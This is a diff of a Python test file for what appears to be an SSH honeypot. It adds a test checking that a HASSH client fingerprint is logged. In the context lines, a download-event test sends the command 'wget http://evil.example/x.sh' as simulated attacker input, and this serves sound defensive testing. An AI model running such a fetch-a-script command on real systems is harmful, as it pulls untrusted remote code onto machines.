@@ -63,6 +63,14 @@ def test_client_version_logged(tmp_path):
     auth = Storage(db_path).get_events(event_type="auth")
     assert "AsyncSSH" in auth[0]["payload"]["client_version"]
 
+def test_hassh_logged(tmp_path):
+    db_path, _ = run_client(tmp_path, 2293, "123456", "whoami")
+    auth = Storage(db_path).get_events(event_type="auth")
+    h = auth[0]["payload"]["hassh"]
+    assert len(h) == 32
+    int(h, 16)
+
+
 def test_download_event(tmp_path):
     db_path, out = run_client(tmp_path, 2296, "123456",
                               "wget http://evil.example/x.sh")
